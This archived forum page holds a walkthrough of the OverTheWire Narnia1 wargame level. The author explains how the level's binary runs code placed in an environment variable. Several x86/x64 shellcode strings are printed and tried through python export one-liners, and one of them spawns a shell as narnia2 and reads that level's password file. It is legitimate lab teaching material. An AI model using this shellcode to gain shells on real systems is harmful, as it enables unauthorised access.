<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Over The Wire: Narnia1 - Environment variables and Shellcode - CTF - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Over The Wire: Narnia1 - Popping a shell.
Ok, now that we‚Äôve gotten past narnia0, it‚Äôs time to do narnia1. 
Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0. 

123loade&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="675.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="kt4bHYbkNbDjMboJKLxUYURTP"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="kt4bHYbkNbDjMboJKLxUYURTP"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Over The Wire: Narnia1 - Environment variables and Shellcode&#39;" href="675.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/over-the-wire-narnia1-environment-variables-and-shellcode/675" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/over-the-wire-narnia1-environment-variables-and-shellcode/675" />
<meta property="og:title" content="Over The Wire: Narnia1 - Environment variables and Shellcode" />
<meta name="twitter:title" content="Over The Wire: Narnia1 - Environment variables and Shellcode" />
<meta property="og:description" content="Over The Wire: Narnia1 - Popping a shell. Ok, now that we‚Äôve gotten past narnia0, it‚Äôs time to do narnia1.  Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0.   123loaded@redhat ssh narnia1@labs.overthewire.org  ssh narnia1@narnia.labs.overthewire.org    This is the OverTheWire game server. More information on OverTheWire: Wargames    Please note that wargame usernames are no longer level, but wargamename  e.g. vortex4, semtex2, ‚Ä¶    Note: at th..." />
<meta name="twitter:description" content="Over The Wire: Narnia1 - Popping a shell. Ok, now that we‚Äôve gotten past narnia0, it‚Äôs time to do narnia1.  Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0.   123loaded@redhat ssh narnia1@labs.overthewire.org  ssh narnia1@narnia.labs.overthewire.org    This is the OverTheWire game server. More information on OverTheWire: Wargames    Please note that wargame usernames are no longer level, but wargamename  e.g. vortex4, semtex2, ‚Ä¶    Note: at th..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="11 ‚ù§" />
<meta property="article:published_time" content="2016-06-30T06:20:25+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="675.html">Over The Wire: Narnia1 - Environment variables and Shellcode</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F1592A'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>CTF</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Over The Wire: Narnia1 - Environment variables and Shellcode'>
      <link itemprop='url' href='675.html'>
      <meta itemprop='datePublished' content='2016-06-30T06:20:25Z'>
        <meta itemprop='articleSection' content='CTF'>
      <meta itemprop='keywords' content=''>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/123loaded.html'><span itemprop='name'>123loaded</span></a>
                (123loaded)
              </span>

                <link itemprop="mainEntityOfPage" href="675.html">


              <span class="crawler-post-infos">
                  <time  datetime='2016-06-30T06:20:25Z' class='post-time'>
                    June 30, 2016,  6:20am
                  </time>
                  <meta itemprop='dateModified' content='2016-06-30T06:28:22Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h2><a name="p-3287-over-the-wire-narnia1-popping-a-shell-1" class="anchor" href="#p-3287-over-the-wire-narnia1-popping-a-shell-1"></a>Over The Wire: Narnia1 - Popping a shell.</h2>
<p>Ok, now that we‚Äôve gotten past <a href="../../../external.html?link=https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663" rel="noopener nofollow ugc">narnia0</a>, it‚Äôs time to do narnia1.<br>
Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0.</p>
<blockquote>
<p>123loaded@redhat ssh <a href="../../cdn-cgi/l/email-protection.html#46282734282f2777062a2724356829302334322e23312f342368293421"><span class="__cf_email__" data-cfemail="d1bfb0a3bfb8b0e091bdb0b3a2ffbea7b4a3a5b9b4a6b8a3b4ffbea3b6">[email&#160;protected]</span></a><br>
ssh <a href="../../cdn-cgi/l/email-protection.html#2947485b474048186947485b4740480745484b5a07465f4c5b5d414c5e405b4c07465b4e"><span class="__cf_email__" data-cfemail="97f9f6e5f9fef6a6d7f9f6e5f9fef6b9fbf6f5e4b9f8e1f2e5e3fff2e0fee5f2b9f8e5f0">[email&#160;protected]</span></a></p>
</blockquote>
<blockquote>
<p>This is the OverTheWire game server. More information on <a href="../../../external.html?link=http://www.overthewire.org/wargames" class="inline-onebox" rel="noopener nofollow ugc">OverTheWire: Wargames</a></p>
</blockquote>
<blockquote>
<p>Please note that wargame usernames are no longer level, but wargamename<br>
e.g. vortex4, semtex2, ‚Ä¶</p>
</blockquote>
<blockquote>
<p>Note: at this moment, blacksun is not available.</p>
</blockquote>
<blockquote>
<p><a href="../../cdn-cgi/l/email-protection.html#17797665797e762657797665797e76397b7675643978617265637f72607e657239786570"><span class="__cf_email__" data-cfemail="412f20332f282070012f20332f28206f2d2023326f2e372433352924362833246f2e3326">[email&#160;protected]</span></a>‚Äôs password:</p>
</blockquote>
<blockquote>
<p>Welcome to the OverTheWire games machine!</p>
</blockquote>
<p>Then go ahead and check out the source code to narnia1.</p>
<blockquote>
<p>narnia1@melinda:~$ cd /games/<br>
narnia1@melinda:/games$ ls<br>
behemoth  eloi  krypton  manpage  maze  narnia  semtex  utumno  vortex<br>
narnia1@melinda:/games$ cd narnia<br>
narnia1@melinda:/games/narnia$ ls<br>
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c<br>
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8<br>
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c<br>
narnia1@melinda:/games/narnia$ cat narnia1.c<br>
int main(){<br>
int (*ret)();</p>
</blockquote>
<blockquote>
<p>if(getenv(‚ÄúEGG‚Äù)==NULL){<br>
printf(‚ÄúGive me something to execute at the env-variable EGG\n‚Äù);<br>
exit(1);<br>
}</p>
</blockquote>
<blockquote>
<p>printf(‚ÄúTrying to execute EGG!\n‚Äù);<br>
ret = getenv(‚ÄúEGG‚Äù);<br>
ret();</p>
</blockquote>
<blockquote>
<p>return 0;<br>
}</p>
</blockquote>
<p>Ok, so without going into the semantics of C and how they set the variable <strong>ret</strong> equal to a <strong>pointer to a function</strong>, we can see that this program gets data from the environment variable <strong>$EGG</strong> and then tries to <em>run</em> what is in <strong>$EGG</strong>. However, it isn‚Äôt just running it like passing it to a command line or anything‚Ä¶ the way this code is written, the program gets the memory address of <strong>$EGG</strong> and sets it equal to <strong>ret</strong>. When <strong>ret()</strong> is called, the code is going to jump to where <strong>$EGG</strong> is stored, and from there it expects machine instructions to continue execution flow.</p>
<p>Essentially they‚Äôve just given us a program where we have control of the execution flow, and by inserting specific machine instructions, we can call /bin/sh, under privileges of the user narnia2 to gain access to narnia2‚Äôs password. These machine instructions, are referred to as <strong>shellcode</strong>. Shellcode is basically a list of carefully crafted instructions that can be executed once the code is injected into a running application. The term shellcode literally refers to written code that starts a command shell, but often times shellcode is writen to do more robust tasks, commonly something like a reverse tcp bind to a given a remote user who is listening on the connect back port access to the shell he just popped.</p>
<p>Shellcode is <strong>operating system (read: architecture) and machine</strong> specific‚Ä¶ the shellcode used to pop a shell on one architecture is <em>not</em> going to pop a shell on another architecture. (Note: <strong>machine</strong> specific is referring to a machine that has some BIOS options enabled such as disabling execute bit (NXBit), this may cause shellcode to work on one machine but not another even though they‚Äôre running the same OS and hardware.)</p>
<p>So, if you‚Äôre feeling super leet, you could <a href="../../../external.html?link=https://0x00sec.org/t/linux-shellcoding-part-1-0/289" rel="noopener nofollow ugc">write your own shellcode</a>. This can be done as simply as creating a small program in C/C++ that literally just does ‚Äúexecve(‚Äù/bin/sh",0,0);", compile your program into an executable binary, and then <a href="../../../external.html?link=https://0x00sec.org/t/extracting-a-payload/667" rel="noopener nofollow ugc">extract the shellcode out of your binary</a> using objdump, hd, xxd, or a custom program like <span class="mention">@unh0lys0da</span>‚Äôs h2d.</p>
<p>However, for this tutorial, we‚Äôre just going to google for shellcode  and try some out until we find some that works. But first we need to know some system information, primarily just the architecture type of the CPU. For this info, we try ‚Äúarch‚Äù, and then realize that the info given by arch really just specifies 32 or 64 bit‚Ä¶ ‚Äúlscpu‚Äù gives much more detailed info.</p>
<blockquote>
<p>narnia1@melinda:~$ arch<br>
x86_64<br>
narnia1@melinda:~$ lscpu<br>
Architecture:          x86_64<br>
CPU op-mode(s):        32-bit, 64-bit<br>
Byte Order:            Little Endian<br>
CPU(s):                8<br>
On-line CPU(s) list:   0-7<br>
Thread(s) per core:    1<br>
Core(s) per socket:    1<br>
Socket(s):             8<br>
NUMA node(s):          1<br>
Vendor ID:             GenuineIntel<br>
CPU family:            6<br>
Model:                 45<br>
Stepping:              7<br>
CPU MHz:               2599.998<br>
BogoMIPS:              5202.66<br>
Hypervisor vendor:     KVM<br>
Virtualization type:   full<br>
L1d cache:             32K<br>
L1i cache:             32K<br>
L2 cache:              256K<br>
L3 cache:              20480K<br>
NUMA node0 CPU(s):     0-7</p>
</blockquote>
<p>Ok, so knowing that this is an Intel CPU that can run either 32 or 64 bit op-codes, this must be a 64 bit Intel CPU. A great website for shellcode is <a href="../../../external.html?link=http://shell-storm.org/shellcode/" rel="noopener nofollow ugc">shell-storm.</a> Once we find some shellcode we want to try, we need to create the environment variable <strong>$EGG</strong> and set it to our shellcode using the <strong>export</strong> command. But remember, shellcode (machine code in general) is not in the realm of printable ASCII (all the characters you know and can read)‚Ä¶ we will use <strong>python</strong> to turn our shellcode into raw machine code.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
H1ÔøΩHÔøΩ//bin/shHÔøΩSHÔøΩÔøΩPWHÔøΩÔøΩÔøΩ;</p>
</blockquote>
<p>Ok, breaking this down, <strong>export</strong> creates an environment variable. In this case we named it EGG. We use <strong>python</strong> with the <strong>-c</strong> option to run a single command from the command line, rather than open python interpreter. We have to put quotes around the entire <strong>print</strong> command to have it work, and the <strong>print</strong> command itself requires that we pass its argument in quotes as well. <em>(Note that it doesn‚Äôt matter whether you single quote the print statement and double quote its argument or double quote the print statement and single quote its argument, you just have to use different types of quotes for the different arguments.)</em>  The ‚Äú\x‚Äù is telling python that the value is a hex value, which is always converted to/from machine code as two hexadecimal characters (0-9 or A-F). Hex values <strong><em>can</em></strong> be printable characters‚Ä¶ for example, <strong>python -c ‚Äòprint ‚Äú\x41\x42\x43\x44‚Äù‚Äô</strong> will have python print out ‚ÄúABCD‚Äù because A is 41 in hex, B is 42, and so on.</p>
<p>Lastly, we surround our entire <strong>python</strong> command in <strong>back ticks</strong> ( ` ) because when you put a command in back ticks, bash executes that statement first, and then uses the result in place of the back-ticked string. Conversely, this can be done by putting the statement in parenthesis like so, with a dollar sign at the front.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=$(python -c ‚Äòprint ‚Äú\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05‚Äù‚Äô)<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
H1ÔøΩHÔøΩ//bin/shHÔøΩSHÔøΩÔøΩPWHÔøΩÔøΩÔøΩ;</p>
</blockquote>
<p>So now lets run narnia1!</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault</p>
</blockquote>
<p>Errrr crap, would appear that that shellcode doesn‚Äôt work quite right on this architecture‚Ä¶ let‚Äôs find another and try again.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault</p>
</blockquote>
<p>Nope‚Ä¶ ok, lets try until something works.</p>
<blockquote>
<p>narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
ÔøΩ[1ÔøΩÔøΩCÔøΩÔøΩC<br>
PÔøΩRSÔøΩ;PÕÄÔøΩÔøΩÔøΩÔøΩÔøΩ/bin/sh<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x52\x53\x53\x6a\x3b\x58\xcd\x80‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
ÔøΩRhn/shh//biÔøΩÔøΩQRSSj;XÕÄ<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ echo $EGG<br>
1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
Segmentation fault<br>
narnia1@melinda:/games/narnia$ export EGG=`python -c ‚Äòprint ‚Äú\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43‚Äù‚Äô`<br>
narnia1@melinda:/games/narnia$ ./narnia1<br>
Trying to execute EGG!<br>
$ whoami<br>
narnia2<br>
$ ls<br>
narnia0    narnia1.c  narnia3     narnia4.c  narnia6    narnia7.c<br>
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8<br>
narnia1    narnia2.c  narnia4     narnia5.c  narnia7    narnia8.c<br>
$ cd /etc/narnia_pass<br>
$ ls<br>
narnia0  narnia2  narnia4  narnia6  narnia8<br>
narnia1  narnia3  narnia5  narnia7  narnia9<br>
$ cat narnia2</p>
</blockquote>
<p>Awesome. Now we have the password to narnia2, and more importantly, we have verified that a specific shellcode works on the narnia servers, because you Always want to verify your shellcode works before trying to jump into creating an exploit and want/Need to be able to rule that out as a possible reason your exploit might not be landing like you‚Äôd expect.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="7" />
              <span class='post-likes'>7 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-06-30T17:16:27Z' class='post-time'>
                    June 30, 2016,  5:16pm
                  </time>
                  <meta itemprop='dateModified' content='2016-07-02T10:47:22Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Nice post.</p>
<p>The different interrelations between user space and kernel regarding the architecture is not trivial. But as a general rule, what is relevant, from the point of view of a shellcode is the architecture of the user space. Anyone interested on how  this works on Linux, should read this great article.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/e3ab9932ec4122e287ecab561115b35feded05c7.png" class="site-icon" width="" height="">
      <a href="../../../external.html?link=https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">lwn.net</a>
  </header>
  <article class="onebox-body">
    <img src="#" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://lwn.net/Articles/604515/" target="_blank" rel="noopener nofollow ugc">Anatomy of a system call, part 2 [LWN.net]</a></h3>

<p>
      The previous article explored the kernel
